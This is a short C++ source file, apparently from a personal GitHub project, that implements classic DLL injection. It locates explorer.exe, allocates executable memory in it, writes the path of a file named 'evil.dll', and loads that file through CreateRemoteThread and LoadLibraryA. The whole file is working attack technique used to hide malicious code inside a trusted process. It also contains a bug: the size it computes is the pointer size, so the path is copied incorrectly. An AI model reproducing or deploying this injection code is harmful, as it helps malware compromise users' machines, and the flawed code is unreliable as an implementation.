/*
	Author: https://github.com/1emvr 2023-02-15 21:18 EST
	Description: Simple Dll Injection
*/
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <windows.h>
#include <tlhelp32.h>

const char *dllPath = "C:\\Users\\lemvr\\OneDrive\\Desktop\\Visual Studio\\Classic Dll Injection\\evil.dll";
size_t dllSize = sizeof(dllPath);

DWORD GetProcessId(std::wstring processName) {

	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 1;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(void) {

	std::wstring processName = L"explorer.exe";
	DWORD pid = GetProcessId(processName);

	if (pid == 0) {
		printf("PID not found. Exiting.\n");
		return 1;
	}

	printf("PID : %i", pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	HMODULE hModule = GetModuleHandle((LPCSTR)"kernel32.dll");
	LPVOID lpStartAddress = (LPVOID)GetProcAddress(hModule, "LoadLibraryA");

	WriteProcessMemory(hProcess, lpBaseAddress, dllPath, dllSize, NULL);
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);

	CloseHandle(hProcess);
	return 0;
}